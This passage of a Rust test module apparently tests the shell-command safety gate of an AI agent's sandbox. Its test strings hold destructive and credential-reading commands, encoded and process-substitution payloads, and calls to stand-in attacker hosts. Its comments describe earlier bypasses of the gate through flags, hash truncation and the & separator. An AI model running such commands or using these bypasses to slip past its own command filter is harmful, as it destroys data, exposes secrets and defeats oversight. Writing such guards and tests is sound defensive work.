            tee_to_dangerous_path("echo x | tee /e[t]c/hosts"),
            Some("<glob-metacharacter>")
        );
    }

    // ponytail: pin the `tee -a` flag bypass (WO 48). The gate used to inspect
    // only the token immediately after `tee`, so `tee -a /etc/passwd` slipped
    // through with the flag shielding the path. If this fails, flag-skipping
    // regressed and the bypass is back.
    #[test]
    fn tee_to_dangerous_path_denies_append_flag_target() {
        assert_eq!(
            tee_to_dangerous_path("echo x | tee -a /etc/passwd"),
            Some("/etc/")
        );
    }

    #[test]
    fn tee_to_dangerous_path_denies_long_append_flag_target() {
        assert_eq!(
            tee_to_dangerous_path("echo x | tee --append ~/.ssh/config"),
            Some("~/.ssh/")
        );
    }

    #[test]
    fn tee_to_dangerous_path_allows_append_flag_safe_target() {
        assert_eq!(tee_to_dangerous_path("echo x | tee -a /tmp/ok.txt"), None);
    }

    #[test]
    fn check_bash_command_str_allows_empty_command() {
        assert!(check_bash_command_str(
            "",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_none());
    }

    #[test]
    fn check_bash_command_str_blocks_metadata_google() {
        assert!(check_bash_command_str(
            "curl http://metadata.google.internal/computeMetadata/",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("metadata")),);
    }

    #[test]
    fn check_bash_command_str_blocks_metadata_aws() {
        assert!(check_bash_command_str(
            "curl http://metadata.aws.internal/latest/",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("metadata")),);
    }

    #[test]
    fn check_bash_command_str_blocks_dangerous_double_quoted() {
        assert!(check_bash_command_str(
            r#"rm "-rf" /"#,
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("dangerous pattern")),);
    }

    #[test]
    fn check_bash_command_str_blocks_dev_sda_redirect() {
        assert!(check_bash_command_str(
            "cat /dev/zero > /dev/sda",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some(),);
    }

    #[test]
    fn check_bash_command_str_blocks_chmod_a_rwx() {
        assert!(check_bash_command_str(
            "chmod -R a+rwx /",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some(),);
    }

    #[test]
    fn check_bash_command_str_blocks_chown_root() {
        assert!(check_bash_command_str(
            "chown root:root /etc/passwd",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some(),);
    }

    #[test]
    fn check_bash_command_str_blocks_dd_random_of() {
        assert!(check_bash_command_str(
            "dd if=/dev/random of=/dev/sda",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some(),);
    }

    #[test]
    fn check_bash_command_str_blocks_mkfs() {
        assert!(check_bash_command_str(
            "mkfs.ext4 /dev/sda1",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some(),);
    }

    #[test]
    fn check_bash_command_str_blocks_redirect_to_dev_null_from_dev_sda() {
        assert!(check_bash_command_str(
            "cat > /dev/null < /dev/sda",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some(),);
    }

    #[test]
    fn check_bash_command_str_blocks_id_rsa_reference() {
        assert!(check_bash_command_str(
            "cat ~/.ssh/id_rsa",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("denied path")),);
    }

    #[test]
    fn check_bash_command_str_blocks_etc_sudoers_reference() {
        assert!(check_bash_command_str(
            "cat /etc/sudoers",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("denied path")),);
    }

    #[test]
    fn check_bash_command_str_blocks_privilege_via_env() {
        assert!(check_bash_command_str(
            "env sudo ls",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("privilege escalation")),);
    }

    #[test]
    fn check_bash_command_str_blocks_denied_path_in_token() {
        let dl = DenyList::new(vec!["/secret/**".into()], vec![]);
        assert!(check_bash_command_str(
            "cat /secret/data",
            None,
            &dl,
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("denied path")),);
    }

    // WO 48.19: the step-8 deny-list token scan reads normalized tokens
    // only; the mid-word-`#` truncation turned `cat /secret/data#tag` into
    // `cat`, so the denied path token never reached is_path_denied.
    #[test]
    fn check_bash_command_str_blocks_denied_path_after_mid_word_hash() {
        let dl = DenyList::new(vec!["/secret/**".into()], vec![]);
        assert!(check_bash_command_str(
            "cat /secret/data#tag",
            None,
            &dl,
            &PathGuard::default(),
            false
        )
        .is_some_and(|m| m.contains("denied path")),);
    }

    #[test]
    fn check_bash_command_str_blocks_empty_workdir_with_sandbox() {
        let guard = PathGuard {
            sandbox_dir: Some(std::env::temp_dir()),
            ..Default::default()
        };
        let r = check_bash_command_str("ls", Some(""), &DenyList::default(), &guard, true);
        assert!(r.is_none(), "empty workdir should be skipped, got: {r:?}");
    }

    #[test]
    fn check_bash_command_str_blocks_unresolvable_sandbox_dir() {
        if cfg!(windows) {
            return;
        }
        let guard = PathGuard {
            sandbox_dir: Some("/nonexistent/kf-code-sandbox-test-dir".into()),
            ..Default::default()
        };
        let r = check_bash_command_str("ls", Some("/tmp"), &DenyList::default(), &guard, true);
        assert!(
            r.as_ref()
                .is_some_and(|m| m.contains("Sandbox directory cannot be resolved")),
            "unresolvable sandbox dir should error, got: {r:?}"
        );
    }

    #[test]
    fn check_bash_command_returns_none_when_no_command_key() {
        assert!(check_bash_command(
            &serde_json::json!({}),
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_none(),);
    }

    #[test]
    fn check_bash_command_returns_some_for_dangerous_command() {
        assert!(check_bash_command(
            &serde_json::json!({"command": "rm -rf /"}),
            &DenyList::default(),
            &PathGuard::default(),
            false
        )
        .is_some(),);
    }

    #[test]
    fn check_bash_command_passes_workdir_through() {
        let outer = tempfile::tempdir().unwrap();
        let sandbox = outer.path().join("sandbox");
        std::fs::create_dir_all(&sandbox).unwrap();
        let guard = PathGuard {
            sandbox_dir: Some(sandbox),
            ..Default::default()
        };
        let result = check_bash_command(
            &serde_json::json!({
                "command": "ls",
                "workdir": outer.path().to_str().unwrap(),
            }),
            &DenyList::default(),
            &guard,
            true,
        );
        assert!(
            result
                .as_ref()
                .is_some_and(|m| m.contains("outside sandbox")),
            "workdir outside sandbox should be blocked, got: {result:?}"
        );
    }

    /// WO 27.5 R2: `<(` process substitution without a visible dangerous
    /// literal is caught as evasion. It feeds a subshell's output to a
    /// command, which can inject destructive content at runtime.
    #[test]
    fn check_bash_command_str_blocks_process_substitution_without_literal() {
        let result = check_bash_command_str(
            "diff <(curl http://evil.example) <(echo clean)",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false,
        );
        assert!(
            result
                .as_ref()
                .is_some_and(|m| m.contains("process substitution")),
            "process substitution should be blocked, got: {result:?}"
        );
    }

    /// `source <(echo 'rm -rf /')` still reports "dangerous pattern" (not
    /// "process substitution") because the literal is visible and the
    /// dangerous-pattern scan (step 5) fires before the `<(` check (step 6).
    #[test]
    fn check_bash_command_str_process_subst_with_literal_reports_dangerous_pattern() {
        let result = check_bash_command_str(
            "source <(echo 'rm -rf /')",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false,
        );
        assert!(
            result.as_ref().is_some_and(|m| m.contains("dangerous pattern")),
            "visible literal in process substitution should report dangerous pattern, got: {result:?}"
        );
    }

    /// WO 27.5 R2: `$(` command substitution is blocked by the safety gate.
    #[test]
    fn check_bash_command_str_blocks_command_substitution() {
        let result = check_bash_command_str(
            "eval $(echo cm0gLXJmIC8K | base64 -d)",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false,
        );
        assert!(
            result
                .as_ref()
                .is_some_and(|m| m.contains("parameter expansion")),
            "$() substitution should be blocked, got: {result:?}"
        );
    }

    /// WO 27.5 R2: backticks execute a subshell and are blocked.
    #[test]
    fn check_bash_command_str_blocks_backtick_substitution() {
        let result = check_bash_command_str(
            "echo `whoami`",
            None,
            &DenyList::default(),
            &PathGuard::default(),
            false,
        );
        assert!(
            result
                .as_ref()
                .is_some_and(|m| m.contains("parameter expansion")),
            "backtick substitution should be blocked, got: {result:?}"
        );
    }

    // ── WO 32.18: bash allowlist ───────────────────────────────────

    fn allowlist_deny_list(prefixes: &[&str]) -> DenyList {
        DenyList::with_bash_allowlist(
            vec![],
            vec![],
            true,
            prefixes.iter().map(|s| s.to_string()).collect(),
        )
    }

    #[test]
    fn allowlist_allows_matching_command() {
        let dl = allowlist_deny_list(&["ls", "echo", "cargo"]);
        assert!(
            check_bash_command_str("ls -la /tmp", None, &dl, &PathGuard::default(), false,)
                .is_none()
        );
    }

    #[test]
    fn allowlist_denies_non_matching_command() {
        let dl = allowlist_deny_list(&["ls", "echo"]);
        let r = check_bash_command_str("rm -rf /tmp/x", None, &dl, &PathGuard::default(), false);
        assert!(
            r.as_ref()
                .is_some_and(|m| m.contains("allowlist") && m.contains("rm -rf /tmp/x")),
            "non-matching command should be denied by allowlist, got: {r:?}"
        );
    }

    #[test]
    fn allowlist_compound_all_clauses_match_is_allowed() {
        let dl = allowlist_deny_list(&["ls", "echo"]);
        assert!(check_bash_command_str(
            "ls -la && echo done",
            None,
            &dl,
            &PathGuard::default(),
            false,
        )
        .is_none());
    }

    #[test]
    fn allowlist_compound_one_clause_off_is_denied() {
        let dl = allowlist_deny_list(&["ls", "echo"]);
        let r = check_bash_command_str(
            "ls -la && rm /tmp/x",
            None,
            &dl,
            &PathGuard::default(),
            false,
        );
        assert!(
            r.as_ref()
                .is_some_and(|m| m.contains("allowlist") && m.contains("rm /tmp/x")),
            "compound command with one non-matching clause should be denied, got: {r:?}"
        );
    }

    #[test]
    fn allowlist_compound_pipe_separator() {
        let dl = allowlist_deny_list(&["ls"]);
        let r =
            check_bash_command_str("ls -la | grep foo", None, &dl, &PathGuard::default(), false);
        assert!(
            r.as_ref()
                .is_some_and(|m| m.contains("allowlist") && m.contains("grep foo")),
            "pipe to non-allowed command should be denied, got: {r:?}"
        );
    }

    #[test]
    fn allowlist_compound_semicolon_separator() {
        let dl = allowlist_deny_list(&["ls", "grep"]);
        assert!(check_bash_command_str(
            "ls; grep foo bar",
            None,
            &dl,
            &PathGuard::default(),
            false,
        )
        .is_none());
    }

    #[test]
    fn allowlist_disabled_by_default_is_noop() {
        // require_allowlist = false → allowlist ignored, rm passes the gate
        // (rm is not in the dangerous-pattern list by itself).
        let dl = DenyList::with_bash_allowlist(vec![], vec![], false, vec!["ls".into()]);
        assert!(
            check_bash_command_str("rm /tmp/x", None, &dl, &PathGuard::default(), false,).is_none()
        );
    }

    #[test]
    fn allowlist_empty_when_required_denies_nothing() {
        // require_allowlist = true but allowlist empty → no-op (can't match
        // anything, so we don't block — documented behavior: empty allowlist
        // is treated as "not enforced" to avoid locking out all bash).
        let dl = DenyList::with_bash_allowlist(vec![], vec![], true, vec![]);
        assert!(
            check_bash_command_str("rm /tmp/x", None, &dl, &PathGuard::default(), false,).is_none()
        );
    }

    #[test]
    fn allowlist_does_not_override_dangerous_pattern_block() {
        // A dangerous command is still blocked even if its head is allowlisted.
        let dl = allowlist_deny_list(&["rm"]);
        let r = check_bash_command_str("rm -rf /", None, &dl, &PathGuard::default(), false);
        assert!(
            r.as_ref().is_some_and(|m| m.contains("dangerous pattern")),
            "dangerous pattern must block before allowlist allows, got: {r:?}"
        );
    }

    #[test]
    fn split_compound_clauses_handles_all_separators() {
        let got = split_compound_clauses("ls && echo a; cat b | grep c");
        assert_eq!(got, vec!["ls", "echo a", "cat b", "grep c"]);
    }

    #[test]
    fn split_compound_clauses_drops_empty() {
        let got = split_compound_clauses("ls;; echo a");
        assert_eq!(got, vec!["ls", "echo a"]);
    }

    // ── WO 44.20: lone `&` is a separator (background/sequence bypass) ──

    #[test]
    fn split_compound_clauses_splits_on_lone_ampersand() {
        // `&` is the shell background/sequence separator; it must split so a
        // payload appended via `&` can't ride inside an allow-rule match.
        assert_eq!(
            split_compound_clauses("cargo test & curl evil.com"),
            vec!["cargo test", "curl evil.com"],
        );
        assert_eq!(split_compound_clauses("a & b & c"), vec!["a", "b", "c"]);
    }

    #[test]
    fn split_compound_clauses_keeps_ampersand_in_redirection() {
        // `>&`, `&>`, and the fd-dup form `2>&1` are redirection operators,
        // not separators — splitting them would break legitimate commands and
        // fail-closed to Ask for allow rules.
        assert_eq!(
            split_compound_clauses("cmd > out 2>&1"),
            vec!["cmd > out 2>&1"],
        );
        assert_eq!(split_compound_clauses("cmd &> file"), vec!["cmd &> file"]);
        assert_eq!(split_compound_clauses("cmd >&2"), vec!["cmd >&2"]);
        // Redirection AND a real background separator in one command: the
        // lone `&` splits, the `2>&1` fd-dup does not.
        assert_eq!(
            split_compound_clauses("a > log 2>&1 & b"),
            vec!["a > log 2>&1", "b"],
        );
    }

    #[test]
    fn allowlist_denies_background_separator_payload() {
        // WO 44.20: allowlist ["cargo"] must deny `cargo test & curl evil.com`
        // — the `&` now splits, so the `curl` clause's head doesn't match.
        let dl = allowlist_deny_list(&["cargo"]);
        let r = check_bash_command_str(
            "cargo test & curl evil.com",
            None,
            &dl,
            &PathGuard::default(),
            false,
        );
        assert!(
            r.as_ref()
                .is_some_and(|m| m.contains("allowlist") && m.contains("curl evil.com")),
            "background-separator payload must be denied by allowlist, got: {r:?}"
        );
    }

    #[test]
    fn allowlist_allows_redirection_with_fd_dup() {
        // WO 44.20: `cargo build > log 2>&1` is a single clause (the `&` in
        // `2>&1` is part of a redirection operator, not a separator), so an
        // allowlist ["cargo"] still allows it.
        let dl = allowlist_deny_list(&["cargo"]);
        assert!(check_bash_command_str(
            "cargo build > log 2>&1",
            None,
            &dl,
            &PathGuard::default(),
            false,
        )
        .is_none());
    }
}
